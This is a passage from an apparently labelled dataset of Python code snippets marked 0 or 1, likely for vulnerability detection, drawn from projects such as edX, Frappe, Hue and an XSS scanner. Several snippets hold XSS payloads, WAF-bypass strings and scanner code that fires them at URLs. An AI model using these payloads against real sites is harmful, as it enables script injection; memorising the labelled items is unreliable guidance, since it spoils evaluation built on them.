payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style", "label": 1}, {"snippet_id": 5322, "code": ", 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre'", "label": 0}, {"snippet_id": 20172, "code": " directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"", "label": 0}, {"snippet_id": 24309, "code": " directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set", "label": 0}, {"snippet_id": 45613, "code": " @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data", "label": 0}, {"snippet_id": 18785, "code": " settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/',", "label": 0}, {"snippet_id": 1170, "code": " from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost'", "label": 0}, {"snippet_id": 28032, "code": ".\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except auth.AuthError: raise helpers", "label": 0}, {"snippet_id": 22832, "code": "/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(", "label": 1}, {"snippet_id": 51612, "code": "'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' +DB_ENGINE", "label": 0}, {"snippet_id": 45459, "code": " _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request", "label": 0}, {"snippet_id": 21801, "code": "]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/'", "label": 0}, {"snippet_id": 16000, "code": " test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here", "label": 0}, {"snippet_id": 34638, "code": ", convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf", "label": 0}, {"snippet_id": 10289, "code": " \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else", "label": 0}, {"snippet_id": 12044, "code": "'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views", "label": 0}, {"snippet_id": 39982, "code": " of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants", "label": 0}, {"snippet_id": 23582, "code": "'instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +", "label": 0}, {"snippet_id": 18732, "code": "<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 29063, "code": "+stats_password] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get(", "label": 0}, {"snippet_id": 36186, "code": "\t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t", "label": 0}, {"snippet_id": 32463, "code": " character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense to have the separator charactor configurable. \"\"\" value=value.encode('ascii'", "label": 0}, {"snippet_id": 28377, "code": " Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file.", "label": 0}, {"snippet_id": 46820, "code": " return await self.set_props_by_key('content', content) async def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super", "label": 0}, {"snippet_id": 8924, "code": "'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$", "label": 0}, {"snippet_id": 5139, "code": " def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod", "label": 0}, {"snippet_id": 5583, "code": "=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"", "label": 0}, {"snippet_id": 4650, "code": "'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', ", "label": 0}, {"snippet_id": 12053, "code": ".calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 14825, "code": " test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit", "label": 0}, {"snippet_id": 43182, "code": "'varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df", "label": 0}, {"snippet_id": 16877, "code": "<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 38886, "code": ") \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef", "label": 0}, {"snippet_id": 33852, "code": "\t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(", "label": 0}, {"snippet_id": 32527, "code": ".setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith", "label": 0}, {"snippet_id": 52818, "code": " in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow'", "label": 0}, {"snippet_id": 22142, "code": " admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 35099, "code": ") +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e):", "label": 0}, {"snippet_id": 1719, "code": ": data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass", "label": 0}, {"snippet_id": 4490, "code": " yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A", "label": 0}, {"snippet_id": 602, "code": "\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if", "label": 1}, {"snippet_id": 29034, "code": ".\" % script) \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port", "label": 0}, {"snippet_id": 22280, "code": "'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset'", "label": 0}, {"snippet_id": 42073, "code": "(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor", "label": 0}, {"snippet_id": 4779, "code": "'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer", "label": 0}, {"snippet_id": 4279, "code": ": xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method", "label": 0}, {"snippet_id": 49129, "code": "}'.format(self.column_id, self.query_order) }) else: return self.get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in", "label": 0}, {"snippet_id": 53116, "code": ") coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc", "label": 0}, {"snippet_id": 40585, "code": "(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"", "label": 0}, {"snippet_id": 47942, "code": ".rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect user.notes=notes user.active=True user.save", "label": 0}, {"snippet_id": 15175, "code": "=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir ", "label": 0}, {"snippet_id": 1785, "code": " urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if", "label": 0}, {"snippet_id": 45560, "code": "[('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,", "label": 0}, {"snippet_id": 21748, "code": "'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware", "label": 0}, {"snippet_id": 16777, "code": ")/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 19239, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec", "label": 0}, {"snippet_id": 31200, "code": "=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('table_metrics.html') \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t ", "label": 0}, {"snippet_id": 16804, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>", "label": 1}, {"snippet_id": 37798, "code": "('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar", "label": 0}, {"snippet_id": 22655, "code": "', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 51663, "code": " 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib.auth.password_validation", "label": 0}, {"snippet_id": 44093, "code": "='project'), 'version': TermsFacet(field='version') } def query(self, search, query): \"\"\" Add query part to ``search`` Overriding because we pass ES Query object instead of string \"\"\" if query: search=search", "label": 0}, {"snippet_id": 45474, "code": "), request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs,", "label": 0}, {"snippet_id": 21029, "code": "', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 44229, "code": ".decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES", "label": 0}, {"snippet_id": 49037, "code": " return[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param):", "label": 0}, {"snippet_id": 16946, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 29124, "code": " \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t def waf_install(serv, **kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path", "label": 0}, {"snippet_id": 47053, "code": " invenio_db import db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin", "label": 0}, {"snippet_id": 50749, "code": "(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text", "label": 0}, {"snippet_id": 2017, "code": ")%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss", "label": 0}, {"snippet_id": 28927, "code": "\t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path", "label": 0}, {"snippet_id": 10688, "code": " files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that", "label": 0}, {"snippet_id": 12201, "code": "+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook", "label": 1}, {"snippet_id": 11119, "code": ".py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue", "label": 0}, {"snippet_id": 1781, "code": " import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload():", "label": 0}, {"snippet_id": 28627, "code": " \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie", "label": 0}, {"snippet_id": 4977, "code": "'<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript", "label": 0}, {"snippet_id": 4980, "code": ", '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm", "label": 0}, {"snippet_id": 46604, "code": " django.views.generic import TemplateView, FormView, DetailView from django.urls import reverse from.entryform import EntryForm, entry_form_config, build_question_flag from.models import LifeCondition,", "label": 0}, {"snippet_id": 7355, "code": ".lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED:", "label": 0}, {"snippet_id": 39844, "code": "\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values", "label": 0}, {"snippet_id": 15713, "code": ": pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property", "label": 0}, {"snippet_id": 14276, "code": ".gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), )", "label": 0}, {"snippet_id": 25485, "code": "=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not", "label": 0}, {"snippet_id": 31350, "code": "\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df", "label": 0}, {"snippet_id": 48910, "code": ".object=object def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None", "label": 1}, {"snippet_id": 37988, "code": "\t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list", "label": 0}, {"snippet_id": 5587, "code": ",PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", ", "label": 0}, {"snippet_id": 48876, "code": " if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField", "label": 0}, {"snippet_id": 46204, "code": " 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query", "label": 0}, {"snippet_id": 379, "code": "(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid,", "label": 1}, {"snippet_id": 16154, "code": ", 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student", "label": 0}, {"snippet_id": 15549, "code": "\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not", "label": 0}, {"snippet_id": 25776, "code": " field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='', initial=initial.options.first() if initial else None,", "label": 0}, {"snippet_id": 15273, "code": " processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super", "label": 0}, {"snippet_id": 27092, "code": "(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\")", "label": 1}, {"snippet_id": 19741, "code": "): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related", "label": 0}, {"snippet_id": 52939, "code": " coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials", "label": 0}, {"snippet_id": 17922, "code": ", name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx", "label": 0}, {"snippet_id": 44785, "code": " parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path", "label": 0}, {"snippet_id": 47894, "code": "=mail au.save() user.save() else: username=str(request.POST[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST", "label": 1}, {"snippet_id": 9667, "code": ".submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 30622, "code": "'main', 'log_path') \trows=form.getvalue('rows2') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate", "label": 0}, {"snippet_id": 7523, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=", "label": 0}, {"snippet_id": 46374, "code": " response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection['template']['extracode']=escape(collection['template'", "label": 0}, {"snippet_id": 40081, "code": ".get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype", "label": 0}, {"snippet_id": 39454, "code": " cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\"", "label": 0}, {"snippet_id": 48602, "code": ".primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) ", "label": 0}, {"snippet_id": 10384, "code": " be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout", "label": 0}, {"snippet_id": 29499, "code": " show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line", "label": 0}, {"snippet_id": 480, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except", "label": 0}, {"snippet_id": 45998, "code": "\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user", "label": 0}, {"snippet_id": 43974, "code": " _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is", "label": 0}, {"snippet_id": 39839, "code": ".fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t", "label": 0}, {"snippet_id": 21971, "code": "): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 32902, "code": " f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold", "label": 1}, {"snippet_id": 26157, "code": ".instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget", "label": 0}, {"snippet_id": 33892, "code": "\treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif", "label": 0}, {"snippet_id": 8067, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns ", "label": 0}, {"snippet_id": 18126, "code": ".module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$',", "label": 0}, {"snippet_id": 17859, "code": ")university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), 